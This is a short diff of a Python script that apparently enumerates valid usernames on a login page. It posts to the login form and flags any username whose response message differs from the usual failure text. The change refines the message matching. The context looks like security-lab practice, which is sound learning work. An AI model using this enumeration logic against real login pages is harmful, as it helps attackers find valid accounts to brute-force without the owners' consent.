@@ -33,8 +33,8 @@ def start():
         # Send a POST request to the login URL with the data payload
         req = requests.post(url=url, data=data)
         
-        # Check if the response contains the "Invalid username" message
-        if 'Invalid username' in req.text:
+        # Check if the response reflects a different message
+        if 'Invalid username<' in req.text or 'Invalid username or password.' in req.text:
             print(f'Username: {username} is Wrong')  # Print that the username is incorrect
         else:
             print(f'Username: {username} reflects a differnt msg!, Success!!')  # Print success message
